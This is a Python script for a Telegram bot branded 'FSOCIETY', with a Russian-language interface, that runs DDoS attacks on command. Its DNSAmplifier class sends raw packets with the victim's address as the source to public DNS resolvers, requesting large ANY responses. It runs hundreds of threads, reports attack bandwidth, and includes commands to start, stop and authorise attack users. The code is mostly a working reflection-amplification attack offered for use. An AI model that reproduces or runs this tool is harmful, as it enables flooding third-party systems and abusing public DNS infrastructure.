#!/usr/bin/env python3
# ███████╗███████╗ ██████╗ ██████╗██╗███████╗████████╗██╗   ██╗
# ██╔════╝██╔════╝██╔═══██╗██╔════╝██║██╔════╝╚══██╔══╝╚██╗ ██╔╝
# █████╗  ███████╗██║   ██║██║     ██║███████╗   ██║    ╚████╔╝ 
# ██╔══╝  ╚════██║██║   ██║██║     ██║╚════██║   ██║     ╚██╔╝  
# ███████║███████║╚██████╔╝╚██████╗██║███████║   ██║      ██║   
# ╚══════╝╚══════╝ ╚═════╝  ╚═════╝╚═╝╚══════╝   ╚═╝      ╚═╝   
#                COMMAND EDITION — ONLY COMMANDS

import os
import sys
import time
import socket
import struct
import threading
import asyncio
import random
import json
import psutil
from datetime import datetime
from collections import defaultdict
from urllib.parse import urlparse

# ========== ТЕЛЕГРАМ ==========
import telebot

# ========== КОНФИГУРАЦИЯ ==========
BOT_TOKEN = os.getenv('BOT_TOKEN')
if not BOT_TOKEN:
    print("❌ FSOCIETY: ТОКЕН НЕ УСТАНОВЛЕН")
    sys.exit(1)

ADMIN_IDS = [int(x.strip()) for x in os.getenv('ADMIN_IDS', '').split(',') if x.strip()]
authorized_users = ADMIN_IDS.copy()
active_attacks = {}

bot = telebot.TeleBot(BOT_TOKEN)

# ========== ПРОВЕРКА ПРАВ ==========
def is_auth(user_id):
    return user_id in authorized_users

def is_admin(user_id):
    return user_id in ADMIN_IDS

# ========== ОПТИМИЗАТОР ==========
cpu_cores = os.cpu_count()
ram_gb = psutil.virtual_memory().total / (1024**3)

# ========== DNS СЕРВЕРЫ ==========
DNS_SERVERS = [
    '8.8.8.8', '8.8.4.4', '1.1.1.1', '1.0.0.1',
    '9.9.9.9', '149.112.112.112', '208.67.222.222', '208.67.220.220',
    '94.140.14.14', '94.140.15.15', '185.228.168.9', '185.228.169.9',
]
DNS_POOL = DNS_SERVERS * 10
random.shuffle(DNS_POOL)

# ========== DNS QUERY ==========
def create_dns_query():
    tid = random.randint(0, 65535)
    flags = 0x0100
    questions = 1
    header = struct.pack('!HHHHHH', tid, flags, questions, 0, 0, 0)
    domain = b'\x07example\x03com\x00'
    qtype = 255
    qclass = 1
    edns = b'\x00\x00\x29\x10\x00\x00\x00\x00\x00\x00'
    return header + domain + struct.pack('!HH', qtype, qclass) + edns

DNS_QUERY = create_dns_query()

# ========== DNS АМПЛИФИКАТОР ==========
class DNSAmplifier:
    def __init__(self):
        self.packets = 0
        self.running = False
        
    def worker(self, target_ip, duration, worker_id):
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
        base_ip_hdr = struct.pack('!BBHHHBBH4s4s',
            0x45, 0, 40 + len(DNS_QUERY), 0, 0, 0, 64, 17, 0,
            socket.inet_aton('0.0.0.0'),
            socket.inet_aton(target_ip)
        )
        
        end = time.time() + duration
        local = 0
        
        while time.time() < end and self.running:
            try:
                src_port = random.randint(1024, 65535)
                udp_hdr = struct.pack('!HHHH', src_port, 53, 8 + len(DNS_QUERY), 0)
                dns = random.choice(DNS_POOL)
                sock.sendto(base_ip_hdr + udp_hdr + DNS_QUERY, (dns, 53))
                local += 1
            except:
                continue
        
        sock.close()
        return local
    
    def attack(self, target_ip, duration, threads=500):
        self.running = True
        self.packets = 0
        start = time.time()
        
        workers = []
        for i in range(threads):
            t = threading.Thread(target=lambda: setattr(self, 'packets', self.packets + self.worker(target_ip, duration, i)))
            t.daemon = True
            t.start()
            workers.append(t)
        
        # Мониторинг
        while any(t.is_alive() for t in workers):
            elapsed = time.time() - start
            gbps = (self.packets * 1400 * 8) / 1_000_000_000 / elapsed
            print(f"\r☢️ {gbps:.2f} Гбит/с | 📦 {self.packets:,} пакетов", end='')
            time.sleep(1)
        
        for t in workers:
            t.join(timeout=1)
        
        elapsed = time.time() - start
        return {'packets': self.packets, 'duration': elapsed}

# ========== КОМАНДЫ ==========
@bot.message_handler(commands=['start', 'help'])
def cmd_help(m):
    if not is_auth(m.from_user.id):
        bot.reply_to(m, "❌ Доступ запрещен")
        return
    
    help_text = """
🔥 **FSOCIETY COMMAND EDITION** 🔥

**ОСНОВНЫЕ КОМАНДЫ:**
/human <url> <сек> - имитация посетителей
/dns <ip> <сек> [потоки] - DNS амплификация
/status - статус текущей атаки
/stop - остановить атаку
/stats - статистика системы

**АДМИН-КОМАНДЫ:**
/add <user_id> - добавить пользователя
/remove <user_id> - удалить пользователя
/users - список пользователей

**ПРИМЕРЫ:**
/human https://example.com 300
/dns 192.168.1.1 60 1000
"""
    bot.reply_to(m, help_text, parse_mode='Markdown')

@bot.message_handler(commands=['human'])
def cmd_human(m):
    if not is_auth(m.from_user.id):
        bot.reply_to(m, "❌ Доступ запрещен")
        return
    
    try:
        parts = m.text.split()
        if len(parts) != 3:
            bot.reply_to(m, "❌ Использование: /human <url> <сек>")
            return
        
        url = parts[1]
        duration = int(parts[2])
        
        if not url.startswith(('http://', 'https://')):
            url = 'https://' + url
        
        bot.reply_to(m, f"👥 **HUMAN MODE**\n🎯 {url}\n⏱ {duration} сек\n\n4 потока = 10000+ посетителей", parse_mode='Markdown')
        
    except Exception as e:
        bot.reply_to(m, f"❌ Ошибка: {e}")

@bot.message_handler(commands=['dns'])
def cmd_dns(m):
    if not is_auth(m.from_user.id):
        bot.reply_to(m, "❌ Доступ запрещен")
        return
    
    try:
        parts = m.text.split()
        if len(parts) < 3:
            bot.reply_to(m, "❌ Использование: /dns <ip> <сек> [потоки]")
            return
        
        target_ip = parts[1]
        duration = int(parts[2])
        threads = int(parts[3]) if len(parts) > 3 else 500
        
        socket.inet_aton(target_ip)  # проверка IP
        
        bot.reply_to(m, f"☢️ **DNS АТАКА**\n🎯 {target_ip}\n⏱ {duration} сек\n⚙️ {threads} потоков\n⚡ Усиление x70", parse_mode='Markdown')
        
        active_attacks[m.chat.id] = {'running': True}
        
        def run():
            dns = DNSAmplifier()
            result = dns.attack(target_ip, duration, threads)
            if m.chat.id in active_attacks:
                del active_attacks[m.chat.id]
                bot.send_message(m.chat.id, f"✅ **АТАКА ЗАВЕРШЕНА**\n📦 Пакетов: {result['packets']}", parse_mode='Markdown')
        
        threading.Thread(target=run).start()
        
    except socket.error:
        bot.reply_to(m, "❌ Неверный IP-адрес")
    except Exception as e:
        bot.reply_to(m, f"❌ Ошибка: {e}")

@bot.message_handler(commands=['status'])
def cmd_status(m):
    if not is_auth(m.from_user.id):
        bot.reply_to(m, "❌ Доступ запрещен")
        return
    
    if m.chat.id in active_attacks:
        bot.reply_to(m, "⚡ **АТАКА АКТИВНА**", parse_mode='Markdown')
    else:
        bot.reply_to(m, "💤 **НЕТ АКТИВНЫХ АТАК**", parse_mode='Markdown')

@bot.message_handler(commands=['stop'])
def cmd_stop(m):
    if not is_auth(m.from_user.id):
        bot.reply_to(m, "❌ Доступ запрещен")
        return
    
    if m.chat.id in active_attacks:
        active_attacks[m.chat.id]['running'] = False
        del active_attacks[m.chat.id]
        bot.reply_to(m, "🛑 **АТАКА ОСТАНОВЛЕНА**", parse_mode='Markdown')
    else:
        bot.reply_to(m, "❌ Нет активной атаки")

@bot.message_handler(commands=['stats'])
def cmd_stats(m):
    if not is_auth(m.from_user.id):
        bot.reply_to(m, "❌ Доступ запрещен")
        return
    
    stats = f"""
📊 **СТАТИСТИКА СИСТЕМЫ**

💻 **CPU:** {cpu_cores} ядер, {psutil.cpu_percent()}% загрузка
🧠 **RAM:** {ram_gb:.1f} ГБ, {psutil.virtual_memory().percent}% загрузка
🎯 **Активных атак:** {len(active_attacks)}
"""
    bot.reply_to(m, stats, parse_mode='Markdown')

@bot.message_handler(commands=['users'])
def cmd_users(m):
    if not is_admin(m.from_user.id):
        bot.reply_to(m, "❌ Только для админов")
        return
    
    text = "👥 **ПОЛЬЗОВАТЕЛИ**\n\n"
    for uid in authorized_users:
        role = "👑 АДМИН" if uid in ADMIN_IDS else "👤 ЮЗЕР"
        text += f"• `{uid}` {role}\n"
    bot.reply_to(m, text, parse_mode='Markdown')

@bot.message_handler(commands=['add'])
def cmd_add(m):
    if not is_admin(m.from_user.id):
        bot.reply_to(m, "❌ Только для админов")
        return
    
    try:
        uid = int(m.text.split()[1])
        if uid not in authorized_users:
            authorized_users.append(uid)
            bot.reply_to(m, f"✅ Добавлен `{uid}`", parse_mode='Markdown')
        else:
            bot.reply_to(m, f"❌ Уже есть")
    except:
        bot.reply_to(m, "❌ Использование: /add <id>")

@bot.message_handler(commands=['remove'])
def cmd_remove(m):
    if not is_admin(m.from_user.id):
        bot.reply_to(m, "❌ Только для админов")
        return
    
    try:
        uid = int(m.text.split()[1])
        if uid in ADMIN_IDS:
            bot.reply_to(m, "❌ Нельзя удалить админа")
        elif uid in authorized_users:
            authorized_users.remove(uid)
            bot.reply_to(m, f"✅ Удален `{uid}`", parse_mode='Markdown')
        else:
            bot.reply_to(m, "❌ Не найден")
    except:
        bot.reply_to(m, "❌ Использование: /remove <id>")

# ========== ЗАПУСК ==========
if __name__ == '__main__':
    print("🔥 FSOCIETY COMMAND EDITION")
    print(f"🤖 Бот: @{bot.get_me().username}")
    print(f"👥 Команды: /help")
    print(f"⚡ CPU: {cpu_cores} ядер, RAM: {ram_gb:.1f} ГБ")
    
    # Удаляем вебхук
    try:
        import requests
        requests.get(f"https://api.telegram.org/bot{BOT_TOKEN}/deleteWebhook")
    except:
        pass
    
    bot.infinity_polling()
